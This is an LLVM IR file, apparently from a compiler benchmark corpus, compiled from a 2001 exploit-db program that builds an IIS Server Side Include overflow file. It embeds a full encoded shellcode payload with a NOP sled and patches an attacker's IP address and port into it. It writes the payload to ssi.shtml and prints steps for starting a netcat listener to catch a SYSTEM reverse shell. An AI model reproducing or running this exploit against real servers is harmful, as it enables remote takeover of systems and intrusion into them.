; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_21071.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_21071.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shellcode = private unnamed_addr constant [2078 x i8] c"<!--#include file=\22\90\90\90\90\90\90\90\90\90\90\90\90\90\EB\03]\EB\05\E8\F8\FF\FF\FF\83\C5\15\90\90\90\8B\C53\C9f\B9\D7\02P\800\95@\E2\FA-\95\95d\E2\14\AD\D8\CF\05\95\E1\96\DD~`}\95\95\95\95\C8\1E@\14\7F\9Akjj\1EM\1E\E6\A9\96f\1E\E3\ED\96f\1E\EB\B5\96n\1E\DB\81\A6x\C3\C2\C4\1E\AA\96n\1Eg,\9B\95\95\95f3\E1\9D\CC\CA\16R\91\D0wr\CC\CA\CB\1EX\1E\D3\B1\96VDt\96T\A6\\\F3\1E\9D\1E\D3\89\96VTt\97\96T\1E\95\96V\1Eg\1Ek\1EE,\9E\95\95\95}\E1\94\95\95\A6U9\10U\E0l\C7\C3j\C2A\CF\1EM,\93\95\95\95}\CE\94\95\95R\D2\F1\99\95\95\95R\D2\FD\95\95\95\95R\D2\F9\94\95\95\95\FF\95\18\D2\F1\C5\18\D2\85\C5\18\D2\81\C5j\C2U\FF\95\18\D2\F1\C5\18\D2\8D\C5\18\D2\89\C5j\C2UR\D2\B5\D1\95\95\95\18\D2\B5\C5j\C2Q\1E\D2\85\1C\D2\C9\1C\D2\F5\1E\D2\89\1C\D2\CD\14\DA\D9\94\94\95\95\F3R\D2\C5\95\95\18\D2\E5\C5\18\D2\B5\C5\A6U\C5\C5\C5\FF\94\C5\C5}\95\95\95\95\C8\14x\D5kjj\C0\C5j\C2]j\E2\85j\C2qj\E2\89j\C2q\FD\95\91\95\95\FF\D5j\C2E\1E}\C5\FD\94\94\95\95j\C2}\10U\9A\10>\95\95\95\A6U\C5\D5\C5\D5\C5j\C2y\16mj\9A\11\02\95\95\95\1EM\F3R\92\97\95\F3R\D2\97\8E\ACR\D2\91U=\97\94\FF\85\18\92\C5\C6j\C2a\FF\A7j\C2I\A6\\\C4\C3\C4\C4\C4j\E2\81j\C2Y\10U\E1\F5\05\05\05\05\15\AB\95\E1\BA\05\05\05\05\FF\95\C3\FD\95\91\95\95\C0j\E2\81j\C2M\10U\E1\D5\05\05\05\05\FF\95j\A3\C0\C6j\C2m\16mj\E1\BB\05\05\05\05~'\FF\95\FD\95\91\95\95\C0\C6j\C2i\10U\E9\8D\05\05\05\05\E1\09\FF\95\C3\C5\C0j\E2\8Dj\C2A\FF\A7j\C2I~\1F\C6j\C2e\FF\95j\C2u\A6U9\10U\E0l\C4\C7\C3\C6jG\CF\CC>w{V\D2\F0\E1\C5\E7\FA\F6\D4\F1\F1\E7\F0\E6\E6\95\D9\FA\F4\F1\D9\FC\F7\E7\F4\E7\EC\D4\95\D6\E7\F0\F4\E1\F0\C5\FC\E5\F0\95\D2\F0\E1\C6\E1\F4\E7\E1\E0\E5\DC\FB\F3\FA\D4\95\D6\E7\F0\F4\E1\F0\C5\E7\FA\F6\F0\E6\E6\D4\95\C5\F0\F0\FE\DB\F4\F8\F0\F1\C5\FC\E5\F0\95\D2\F9\FA\F7\F4\F9\D4\F9\F9\FA\F6\95\C2\E7\FC\E1\F0\D3\FC\F9\F0\95\C7\F0\F4\F1\D3\FC\F9\F0\95\C6\F9\F0\F0\E5\95\D0\ED\FC\E1\C5\E7\FA\F6\F0\E6\E6\95\D6\F9\FA\E6\F0\DD\F4\FB\F1\F9\F0\95\C2\C6\DA\D6\DE\A6\A7\95\C2\C6\D4\C6\E1\F4\E7\E1\E0\E5\95\E6\FA\F6\FE\F0\E1\95\F6\F9\FA\E6\F0\E6\FA\F6\FE\F0\E1\95\F6\FA\FB\FB\F0\F6\E1\95\E6\F0\FB\F1\95\E7\F0\F6\E3\95\F6\F8\F1\BB\F0\ED\F0\95\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\903\C0\B0\90\03\D8\8B\03\8B@`3\DB\B3$\03\C3\FF\E0\EB\B9\90\90\051\8Cj\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90f\81\EC\D0\0E\E9\D2\F7\FF\FF\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\8B\94\F8w\10\F3\C7\F3\C7\22-->\0D\0A\00\00", align 16
@.str = private unnamed_addr constant [86 x i8] c"\0Ajim - IIS Server Side Include overflow launcher\0Aby Indigo <indig0@talk21.com> 2001\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [58 x i8] c"To exploit this vulnerability you must have write access\0A\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"to the web root of the target web server.\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [53 x i8] c"This program will generate a file called ssi.shtml.\0A\00", align 1
@.str.4 = private unnamed_addr constant [50 x i8] c"Create a directory in the web root whose name is\0A\00", align 1
@.str.5 = private unnamed_addr constant [56 x i8] c"12 characters long eg. ssi_overflow then put this file\0A\00", align 1
@.str.6 = private unnamed_addr constant [54 x i8] c"into the new directory. Start up a netcat listener:\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [31 x i8] c"nc -l -p <attacker port> -vv\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [54 x i8] c"Access the file http://target/ssi_overflow/ssi.shtml\0A\00", align 1
@.str.9 = private unnamed_addr constant [51 x i8] c"using a web browser. A SYSTEM shell will appear.\0A\0A\00", align 1
@.str.10 = private unnamed_addr constant [72 x i8] c"N.B. I have had problems using Netscape to do this but IE works fine.\0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [43 x i8] c"Usage: %s <attacker host> <attacker port>\0A\00", align 1
@.str.12 = private unnamed_addr constant [12 x i8] c"./ssi.shtml\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"wb\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2078 x i8], align 16
  %7 = alloca i32*, align 8
  %8 = alloca i16, align 2
  %9 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = bitcast [2078 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([2078 x i8], [2078 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 2078, i1 false)
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.1, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.3, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.4, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.5, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.6, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0))
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.8, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.9, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.10, i64 0, i64 0))
  %22 = load i32, i32* %4, align 4
  %23 = icmp ne i32 %22, 3
  br i1 %23, label %24, label %29

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.11, i64 0, i64 0), i8* %27)
  store i32 1, i32* %3, align 4
  br label %81

29:                                               ; preds = %2
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 2
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @atoi(i8* %32)
  %34 = call zeroext i16 @htons(i32 %33)
  store i16 %34, i16* %8, align 2
  %35 = load i16, i16* %8, align 2
  %36 = zext i16 %35 to i32
  %37 = xor i32 %36, 38293
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %8, align 2
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i64 @inet_addr(i8* %41)
  store i64 %42, i64* %9, align 8
  %43 = load i64, i64* %9, align 8
  %44 = xor i64 %43, 2509608341
  store i64 %44, i64* %9, align 8
  %45 = load i16, i16* %8, align 2
  %46 = zext i16 %45 to i32
  %47 = and i32 %46, 255
  %48 = trunc i32 %47 to i8
  %49 = getelementptr inbounds [2078 x i8], [2078 x i8]* %6, i64 0, i64 417
  store i8 %48, i8* %49, align 1
  %50 = load i16, i16* %8, align 2
  %51 = zext i16 %50 to i32
  %52 = ashr i32 %51, 8
  %53 = and i32 %52, 255
  %54 = trunc i32 %53 to i8
  %55 = getelementptr inbounds [2078 x i8], [2078 x i8]* %6, i64 0, i64 418
  store i8 %54, i8* %55, align 2
  %56 = load i64, i64* %9, align 8
  %57 = and i64 %56, 255
  %58 = trunc i64 %57 to i8
  %59 = getelementptr inbounds [2078 x i8], [2078 x i8]* %6, i64 0, i64 422
  store i8 %58, i8* %59, align 2
  %60 = load i64, i64* %9, align 8
  %61 = lshr i64 %60, 8
  %62 = and i64 %61, 255
  %63 = trunc i64 %62 to i8
  %64 = getelementptr inbounds [2078 x i8], [2078 x i8]* %6, i64 0, i64 423
  store i8 %63, i8* %64, align 1
  %65 = load i64, i64* %9, align 8
  %66 = lshr i64 %65, 16
  %67 = and i64 %66, 255
  %68 = trunc i64 %67 to i8
  %69 = getelementptr inbounds [2078 x i8], [2078 x i8]* %6, i64 0, i64 424
  store i8 %68, i8* %69, align 8
  %70 = load i64, i64* %9, align 8
  %71 = lshr i64 %70, 24
  %72 = and i64 %71, 255
  %73 = trunc i64 %72 to i8
  %74 = getelementptr inbounds [2078 x i8], [2078 x i8]* %6, i64 0, i64 425
  store i8 %73, i8* %74, align 1
  %75 = call i32* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0))
  store i32* %75, i32** %7, align 8
  %76 = getelementptr inbounds [2078 x i8], [2078 x i8]* %6, i64 0, i64 0
  %77 = load i32*, i32** %7, align 8
  %78 = call i32 @fputs(i8* %76, i32* %77)
  %79 = load i32*, i32** %7, align 8
  %80 = call i32 @fclose(i32* %79)
  store i32 0, i32* %3, align 4
  br label %81

81:                                               ; preds = %29, %24
  %82 = load i32, i32* %3, align 4
  ret i32 %82
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local zeroext i16 @htons(i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i64 @inet_addr(i8*) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fputs(i8*, i32*) #2

declare dso_local i32 @fclose(i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
